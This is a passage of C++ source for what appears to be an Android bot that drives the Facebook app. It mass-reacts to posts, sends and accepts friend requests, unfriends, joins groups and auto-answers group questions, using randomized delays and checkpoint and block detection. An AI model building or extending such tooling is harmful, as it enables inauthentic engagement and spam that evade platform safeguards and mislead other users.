    ResultScreen actionReactGroup() {
        int soLuong = Common::ranNumber(action.getInt("nudSoLuongProfileFrom"),
                                        action.getInt("nudSoLuongProfileTo"));
        int cbbDoiTuong = action.getInt("cbbDoiTuong");
        vector<string> lstId = action.getList("txtId");

        vector<string> lstGroupsInteracted;
        for (int i = 0; i < soLuong; i++) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (cbbDoiTuong == 0) {
                if (!gotoGroupsList())
                    break;

                if (i > 0)
                    swipe(1, Common::ranNumber(1, 3));

                string xml = dumpXml();
                vector<Node> lstNodes = getNodes("//*[contains(@content-desc,' Button')]", xml);
                Node node;
                for (const Node &n: lstNodes) {
                    string name = Common::strSplit(n.contentDesc, "button")[0];
                    if (!Common::containsItem(lstGroupsInteracted, name)) {
                        node = n;
                        lstGroupsInteracted.push_back(name); // Lưu nhóm vào danh sách đã tương tác
                        break;
                    }
                }
                if (node.empty()) {
                    if (swipeAndScreenNotChange())
                        break;
                    xml = dumpXml();
                    lstNodes = getNodes("//*[contains(@content-desc,' Button')]", xml);

                    for (const Node &n: lstNodes) {
                        string name = Common::strSplit(n.contentDesc, "button")[0];
                        if (!Common::containsItem(lstGroupsInteracted, name)) {
                            node = n;
                            lstGroupsInteracted.push_back(name);
                            break;
                        }
                    }
                    if (node.empty())
                        break;
                }

                lstGroupsInteracted.push_back(node.contentDesc);
                tap(node);
                delay(2);

                if (!waitScreen("FB_ANOTHER_GROUP", "", 30)) {
                    i--;
                    continue;
                }
            } else {
                if (lstId.empty())
                    break;
                string id = Common::ranItem(lstId);
                Common::removeItem(lstId, id);

                if (!gotoGroup(id)) {
                    if (IsSomethingWentWrong())
                        break;

                    i--;
                    continue;
                }
            }

            swipe();
            TuongTacNhieuBaiViet(
                    "React group (" + to_string(i + 1) + "/" + to_string(soLuong) + ")");
        }

        return NOMAP;
    }

    ResultScreen actionReactPage(string status = "React page") {
        vector<string> lstId = action.getList("txtId");
        int soLuong = Common::ranNumber(action.getInt("nudSoLuongFrom"),
                                        action.getInt("nudSoLuongProfileTo"));

        for (int i = 0; i < soLuong; i++) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (lstId.empty())
                break;
            string id = Common::ranItem(lstId);
            Common::removeItem(lstId, id);

            if (!gotoPage(id))
                break;

            if (tap("//*[contains(@content-desc,'Posts, tab')]", ""))
                delay(2);

            swipe();

            TuongTacNhieuBaiViet(status + " (" + to_string(i + 1) + "/" + to_string(soLuong) + ")");
        }
        return NOMAP;
    }

    ResultScreen actionReactProfile() {
        int cbbDoiTuong = action.getInt("cbbDoiTuong");
        if (cbbDoiTuong == 0) {
            if (!gotoProfile())
                return ERROR;

            TuongTacNhieuBaiViet("React profile");
        } else {
            actionReactPage("React profile");
        }

        return NOMAP;
    }

    ResultScreen actionReactWatch() {
        int cbbDoiTuong = action.getInt("cbbDoiTuong");
        if (cbbDoiTuong == 0) {
            if (!gotoWatch())
                return ERROR;
        } else {
            string tuKhoa = Common::ranItem(action.getList("txtTuKhoa"));
            tuKhoa = Common::spinText(tuKhoa);

            updateLine("Search video: " + tuKhoa + "...");
            if (!gotoSearchWatch(tuKhoa))
                return ERROR;
        }

        TuongTacNhieuBaiViet("React watch");

        return NOMAP;
    }

    //Search reel by gotoReel
    bool handleSearchReel(string tuKhoa) {
        updateLine("Search: " + tuKhoa + "...");
        Start:
        if (!gotoReel())
            return false;

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                goto Start;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Search']",
                    "//android.widget.EditText[@text='Search Reels']",
                    "//*[@content-desc='Play current video']",
            });
            if (element == "//*[@content-desc='Search']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.EditText[@text='Search Reels']") {
                inputText(element, tuKhoa);
                delay(1);
                inputEnter();
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Play current video']") {
                tap(element, "", 10);
                return true;
            }
        }
        return false;
    }

    ResultScreen actionReactReel() {
        int cbbDoiTuong = action.getInt("cbbDoiTuong");
        if (cbbDoiTuong == 0) {
            if (!gotoReel())
                return NOMAP;
        } else {
            string tuKhoa = Common::ranItem(action.getList("txtTuKhoa"));
            tuKhoa = Common::spinText(tuKhoa);

            updateLine("Search reel: " + tuKhoa + "...");
            if (!gotoSearch(tuKhoa, "reels")) {
                updateLine("Search fail!Try another...");
                if (!handleSearchReel(tuKhoa))
                    return NOMAP;
            }
            action.jsonConfig.set("isReelByKeywords", true);
        }
        TuongTacNhieuBaiViet("React reel");

        return NOMAP;
    }

    ResultScreen actionReactStory() {
        if (!gotoStory())
            return ERROR;

        TuongTacNhieuBaiViet("React story");
        return NOMAP;
    }

    ResultScreen actionSleep() {
        delay(action.getInt("nudDelayFrom"), action.getInt("nudDelayTo"), "Delay");
        return NOMAP;
    }

    //Hàm đi vào tìm kiếm facebook với từ khóa
    bool gotoSearch(string tuKhoa, string typeSearch) {
        updateLine("Search: " + tuKhoa + "...");
        Start:
        if (!gotoHome())
            return false;

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                goto Start;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Search' or @content-desc='Search Facebook']",
                    "//android.widget.EditText[@text='Search']",
                    "//*[@content-desc='All search results']"
            });

            if (element == "//*[@content-desc='Search' or @content-desc='Search Facebook']") {
                tap(element, xml);
                delay(2);
                continue;
            }

            if (element == "//android.widget.EditText[@text='Search']") {
                inputText(element, tuKhoa);
                delay(1);
                inputEnter();
                delay(2);
                continue;
            }

            if (element == "//*[@content-desc='All search results']") {
                element = "//*[@content-desc='" + typeSearch + " search results']";
                if (!existNode(element, xml)) {
                    vector<Node> lstNodes = getNodes(
                            "//*[contains(@content-desc,' search results')]", xml);
                    swipe(lstNodes.back(), lstNodes.front());
                    delay(2);
                    xml = dumpXml();
                    if (!existNode(element, xml, 3))
                        return false;
                }

                tap(element, xml);
                delay(2);

                if (typeSearch == "reels")
                    return tap("//*[@content-desc='Play current video']", "", 10);
                return true;
            }
            if (!isAppOpened("com.facebook.katana"))
                openApp("com.facebook.katana");
        }
        return false;
    }

    bool gotoStory() {
        Start:
        if (!gotoHome())
            return false;

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                goto Start;
            if (screen == "FB_STORY")
                return true;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Stories tab']",
                    "//*[contains(@content-desc,\"'s story\")]",
                    "//*[@content-desc='Selected Stories tab']",//không có story
                    "//*[@content-desc='Stories']",//không có story
                    "//*[@content-desc='OK']", // popup khi bấm vào story
            });

            if (element == "//*[@content-desc='Selected Stories tab']" ||
                element == "//*[@content-desc='Stories']")
                return false;

            if (!element.empty()) {
                tap(element, xml);
                delay(2);
                continue;
            }

            if (!isAppOpened("com.facebook.katana"))
                openApp("com.facebook.katana");
        }
        return false;
    }

    ResultScreen actionAddFriendKeyword() {
        string txtTuKhoa = Common::ranItem(action.getList("txtTuKhoa"));
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        if (!gotoSearch(txtTuKhoa, "People"))
            return ERROR;
        delay(2);

        updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (screen == "FB_ANOTHER_PROFILE") {
                back();
                delay(2);
                continue;
            }

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Add friend']",
            });

            if (element == "//*[@content-desc='Add friend']") {
                tap(element, xml);
                countSuccess++;
                delay(nudDelayFrom, nudDelayTo,
                      "Add friend " + to_string(countSuccess) + "/" + to_string(soLuong) +
                      " success, delay");
                if (countSuccess >= soLuong)
                    return DONE;

                updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

                timeStart = high_resolution_clock::now();
                continue;
            }

            updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                break;

            //if (!isAppOpened("com.facebook.katana"))
            //    openApp("com.facebook.katana");
        }
        return NOMAP;
    }

    ResultScreen actionAddFriendUid() {
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        vector<string> txtUid = action.getList("txtUid");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

        while (true) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (txtUid.empty())
                break;
            string uid = Common::ranItem(txtUid);
            Common::removeItem(txtUid, uid);

            if (addFriendUid(uid)) {
                countSuccess++;
                delay(nudDelayFrom, nudDelayTo,
                      "Add friend " + to_string(countSuccess) + "/" + to_string(soLuong) +
                      " success, delay");
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

                continue;
            }
        }
        return NOMAP;
    }


    //- Uid không tồn tại => Bỏ qua và chuyển uid khác
    //- Uid đã kết bạn với mình rồi => Bỏ qua và chuyển uid khác
    //- Uid đã gửi lời mời kết bạn cho mình => Accept kết bạn và tính là success
    //- Uid đã được mình gửi lời mời kết bạn trước đó  => Bỏ qua và chuyển uid khác
    //- Uid chưa kết bạn và chưa gửi lời mời => Gửi lời mời kết bạn và tính là success
    bool addFriendUid(string uid) {
        if (!gotoProfile(uid))
            return false;
        delay(2);

        bool isTapAddFriend = false;

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Add friend' or @text='Add friend']",
                    "//*[@content-desc='Cancel request']",
                    "//*[@content-desc='See more']",
                    "//*[@content-desc='Requested']",
                    "//*[@content-desc='Confirm']",
                    "//*[@content-desc='Profile Settings' or @content-desc='Page Settings']",
                    "//*[@text='Your friend request is on the way']",
            });

            if (element == "//*[@content-desc='Add friend' or @text='Add friend']") {
                if (existNode("//*[@text='Your friend request is on the way']", xml)) {
                    back(1, 2);
                    if (existNode("//*[@text='Does this person know you?']", xml, 5)) {
                        tap("//*[@text='CONFIRM']", xml);
                        delay(2);
                    }
                    if (existNode("//*[@text=\"Can't Send Request\"]", xml))
                        return false;
                    swipe(-1);
                    continue;
                }

                tap(element, xml);
                delay(2);
                isTapAddFriend = true;
                continue;
            }
            if (element == "//*[@content-desc='Cancel request']")
                return isTapAddFriend;
            if (element == "//*[@content-desc='See more']") {
                if (existNode(
                        "//*[@content-desc='See more']/preceding-sibling::*[@content-desc='Friends']",
                        xml))
                    return isTapAddFriend;
                if (existNode("//*[@content-desc='Respond']", xml)) {
                    tap("//*[@content-desc='Respond']", xml);
                    delay(2);
                    continue;
                }

                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Requested']")
                return isTapAddFriend;
            if (element == "//*[@content-desc='Confirm']") {
                tap(element, xml);
                delay(2);
                isTapAddFriend = true;
                continue;
            }
            if (element == "//*[@content-desc='Profile Settings' or @content-desc='Page Settings']")
                break;

            if (element == "//*[@text='Your friend request is on the way']") {
                back(1, 2);
                if (existNode("//*[@text='Does this person know you?']", xml, 5)) {
                    tap("//*[@text='CONFIRM']", xml);
                    delay(2);
                }
                if (existNode("//*[@text=\"Can't Send Request\"]", xml))
                    return false;
                swipe(-1);
                continue;
            }
        }
        return false;
    }

    // Gửi lời mời kết bạn thành công => Success
    // Đã gửi lời mời cho user đó => Bỏ qua và tiếp tục action
    // User chặn lời mời kết bạn => Bỏ qua và tiếp tục action
    // User đạt giới hạn bạn bè và không nhận thêm lời mời kết bạn => Bỏ qua và tiếp tục action
    // Account bị giới hạn gửi lời mời kết bạn => Stop action
    // Account đạt giới hạn gửi lời => Stop action
    // User tắt tính năng nhận lời mời => Bỏ qua và tiếp tục action
    ResultScreen actionAddFriendSuggest() {
        //input
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;
        string oldContentDesc;

        if (!gotoFriends())
            return ERROR;
        updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (screen == "FB_ANOTHER_PROFILE") {
                back();
                delay(2);
                continue;
            }

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Suggestions']", // Friend Suggestion
                    "//*[@content-desc='Add friend']", // Add friend button
                    "//*[@text='No Suggestions Available']",
                    "//*[@text=\"You Can't Use This Feature Right Now\"]", // Can't Add Friend
                    "//*[@text='Does this person know you?']",
            });
            if (element == "//*[@content-desc='Suggestions']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Add friend']") {
                string contentDesc = getNode(element + "/parent::*", xml).contentDesc;
                if (contentDesc == oldContentDesc) {
                    countSuccess--;
                    if (swipeAndScreenNotChange())
                        break;
                    continue;
                }
                oldContentDesc = contentDesc;

                tapCenter(element, xml);
                delay(nudDelayFrom, nudDelayTo,
                      "Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;

                updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                continue;
            }
            if (element == "//*[@text='No Suggestions Available']" ||
                element == "//*[@text=\"You Can't Use This Feature Right Now\"]")
                break;
            if (element == "//*[@text='Does this person know you?']") {
                tap("//*[@text='CONFIRM']", xml);
                delay(2);
                continue;
            }

            updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                break;
        }

        return NOMAP;
    }

    ResultScreen actionAcceptFriend() {
        //input
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        if (!gotoFriends())
            return ERROR;

        updateLine("Accept friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (screen == "FB_ANOTHER_PROFILE") {
                back();
                delay(2);
                continue;
            }
            if (existNode("//*[@content-desc='No new requests']", xml)) {
                updateLine("No new request, break...");
                break;
            }
            if (!existNode("//*[@text='Confirm' or @text='Accept']", xml)) {
                swipe(-1);
                updateLine("No new request, break...");
                break;
            }
            string element = existNodes(0, xml, {
                    "//*[@text='Friend requests' or @content-desc='Friend requests']", // Friends Request
                    "//*[@content-desc='Confirm request']",
                    "//*[@text='Invalid Request']", // Invalid request
            });
            if (element == "//*[@text='Friend requests' or @content-desc='Friend requests']") {
                if (existNode("//*[@text='See all']", xml)) {
                    tap("//*[@text='See all']", xml);
                    delay(2);
                    continue;
                }
                if (existNode("//*[@text='Confirm' or @text='Accept']", xml)) {
                    tap("//*[@text='Confirm' or @text='Accept']", xml);
                    delay(nudDelayFrom, nudDelayTo,
                          "Accept friend " + to_string(countSuccess + 1) + "/" +
                          to_string(soLuong) +
                          " success, delay");
                    countSuccess++;
                    if (countSuccess >= soLuong)
                        return DONE;
                    updateLine("Accept friend " + to_string(countSuccess + 1) + "/" +
                               to_string(soLuong));
                    timeStart = high_resolution_clock::now();
                    continue;
                }

                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Confirm request']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@text='Invalid Request']") {
                tap("//*[@text='OK']", xml);
                delay(2);
                if (swipeAndScreenNotChange())
                    break;
                continue;
            }
            updateLine("Accept friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                break;
        }

        return NOMAP;
    }

    // Hủy kết bạn thành công => Success
    //Account bị hạn chế thao tác => Stop
    ResultScreen actionCancelFriend() {
        //input
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        if (!gotoFriendsList())
            return ERROR;

        updateLine("Unfriend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {

            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (screen == "FB_ANOTHER_PROFILE") {
                back();
                delay(2);
                continue;
            }

            string element = existNodes(0, xml, {
                    "//*[@content-desc='No friends to show']",// No friends
                    "//*[@content-desc='More options']", // List friends
                    "//*[contains(@content-desc,'Unfriend')]", // Unfriend
                    "//*[@text='CONFIRM']" // Unfriend
            });
            if (element == "//*[@content-desc='No friends to show']")
                break;
            if (element == "//*[@content-desc='More options']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[contains(@content-desc,'Unfriend')]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@text='CONFIRM']") {
                tap(element, xml);
                countSuccess++;
                delay(nudDelayFrom, nudDelayTo,
                      "Unfriend " + to_string(countSuccess) + "/" + to_string(soLuong) +
                      " success, delay");
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Unfriend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                continue;
            }

            updateLine("Unfriend " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                break;
        }

        return NOMAP;
    }

    //Nhóm chưa tham gia
    //Nhóm đã tham gia
    ResultScreen actionAddFriendGroupKeyword() {
        vector<string> txtId = action.getList("txtId");
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        if (txtId.empty())
            return ERROR;
        updateLine("Go to group member...");
        string idGroup = Common::ranItem(txtId);
        if (!gotoGroupMember(idGroup))
            return ERROR;

        string oldBounds = "";
        int maxSwipe = 3;

        updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Add friend']", // Add friend button
                    "//*[@text='Does this person know you?']",
            });

            if (element == "//*[@content-desc='Add friend']") {
                string bound = getNode(element, xml).bounds;
                if (bound == oldBounds) {
                    countSuccess--;
                    maxSwipe--;
                    if (maxSwipe < 0)
                        break;
                    if (swipeAndScreenNotChange())
                        break;
                    continue;
                }
                oldBounds = bound;

                tapCenter(element, xml);
                countSuccess++;
                delay(nudDelayFrom, nudDelayTo,
                      "Add friend " + to_string(countSuccess) + "/" + to_string(soLuong) +
                      " success, delay");
                if (countSuccess >= soLuong)
                    return DONE;

                updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                continue;
            }
            if (element == "//*[@text='Does this person know you?']") {
                tap("//*[@text='CONFIRM']", xml);
                delay(2);
                continue;
            }
            updateLine("Add friend " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                break;
        }

        return NOMAP;
    }

    //Join thành công => Success
    // Group private => Answerquestion
    // Đã join group trước đó => Skip => Join group khác
    // Đã yêu cầu tham gia group trước đó => Skip
    ResultScreen actionJoinGroupKeyword() {
        vector<string> txtTuKhoa = action.getList("txtTuKhoa");
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        bool ckbTuDongTraLoiCauHoi = action.getBool("ckbTuDongTraLoiCauHoi");
        vector<string> txtCauTraLoi = action.getList("txtCauTraLoi");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        // Go to search
        updateLine("Search...");
        string tuKhoa = Common::ranItem(txtTuKhoa);
        if (!gotoSearch(tuKhoa, "Groups"))
            return ERROR;
        delay(2);

        updateLine("Join Group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {

            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Join group request']", // Join button
                    "//*[@content-desc='Participant questions' or @text='Participant questions']",
                    "//*[@content-desc='Join Group Anyway']",
            });

            if (element == "//*[@content-desc='Join group request']") {
                tap(element, xml);
                countSuccess++;
                delay(nudDelayFrom, nudDelayTo,
                      "Join Group " + to_string(countSuccess) + "/" + to_string(soLuong) +
                      " success, delay");
                if (countSuccess >= soLuong)
                    return DONE;

                updateLine("Join Group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                continue;
            }
            if (element ==
                "//*[@content-desc='Participant questions' or @text='Participant questions']") {
                if (ckbTuDongTraLoiCauHoi)
                    answerQuestion(txtCauTraLoi);
                else
                    tap("//*[@content-desc='Close']", xml);

                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Join Group Anyway']") {
                tap(element, xml);
                delay(2);
                continue;
            }

            updateLine("Join group " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                break;
        }
        return NOMAP;
    }

    // Answer Question Join Group Facebook
    bool answerQuestion(const vector<string> &lstAnswers) {
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string elCheckbox = existNodes(0, xml, {
                    "//android.widget.CompoundButton[@checked='false' and @checkable='true' and @content-desc='']",
                    "//*[@content-desc='You can choose multiple options']/parent::*/parent::*/following-sibling::android.widget.Button",
            });
            if (!elCheckbox.empty()) {
                vector<Node> lstNodes = getNodes(elCheckbox, xml);
                for (const auto &node: lstNodes) {
                    tap(node);
                    delay(1);
                }
            }

            string elRadio = existNodes(0, xml, {
                    "//android.widget.RadioButton[@checked='false' and @checkable ='true' and @content-desc='']",
                    "//*[@content-desc='You can choose one option']/parent::*/parent::*/following-sibling::android.widget.Button",
            });
            if (!elRadio.empty()) {
                vector<Node> lstNodes = getNodes(elRadio, xml);
                for (const auto &node: lstNodes) {
                    tap(node);
                    delay(1);
                }
            }

            string elAnswerText = existNodes(0, xml, {
                    "//android.widget.EditText[@text='Write an answer...' or @text='Write your answer...']",
                    "//*[@text='Write an answer...' or @text='Write your answer...']/following-sibling::android.widget.EditText[@text='']",
            });
            if (!elAnswerText.empty()) {
                inputText(elAnswerText, Common::ranItem(lstAnswers));
                delay(1);
                hideKeyboard();
                delay(1);
                continue;
            }

            if (!swipeAndScreenNotChange())
                continue;

            xml = "";
            string elSubmit = "//*[@content-desc='Submit' or @text='Submit'][@clickable='true']";
            if (existNode(elSubmit, xml)) {
                tap(elSubmit, xml);
                delay(2);
                if (!waitNodeHide(elSubmit, 10))
                    back();
                return true;
            }
        }
        return false;
    }

    ResultScreen actionJoinGroupUid() {
        vector<string> txtUid = action.getList("txtId");
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        bool ckbTuDongTraLoiCauHoi = action.getBool("ckbTuDongTraLoiCauHoi");
        vector<string> txtCauTraLoi = action.getList("txtCauTraLoi");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        updateLine("Join group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        while (true) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (txtUid.empty())
                break;
            string uid = Common::ranItem(txtUid);
            Common::removeItem(txtUid, uid);


            if (joinGroupUid(uid)) {
                countSuccess++;
                delay(nudDelayFrom, nudDelayTo,
                      "Join group " + to_string(countSuccess) + "/" + to_string(soLuong) +
                      " success, delay");
                if (countSuccess >= soLuong)
                    return DONE;

                updateLine("Join group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                continue;
            }
        }
        return NOMAP;
    }

    bool joinGroupUid(const string &uid) {
        bool ckbTuDongTraLoiCauHoi = action.getBool("ckbTuDongTraLoiCauHoi");
        vector<string> txtCauTraLoi = action.getList("txtCauTraLoi");

        if (!gotoGroup(uid))
            return false;
        delay(2);

        bool isTapJoinGroup = false;

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Join group' or @text ='Join group']",
                    "//*[@content-desc='Joined' or @text ='Joined']",
                    "//*[@content-desc='Cancel request' or @text ='Cancel request']",
                    "//*[@content-desc='Participant questions' or @text='Participant questions']",
                    "//*[@text='Answer questions' or @content-desc= 'Answer questions']",
            });

            if (element == "//*[@content-desc='Join group' or @text ='Join group']") {
                if (isTapJoinGroup) {
                    delay(2);
                    continue;
                }

                tap(element, xml);
                delay(2);
                isTapJoinGroup = true;
                continue;
            }
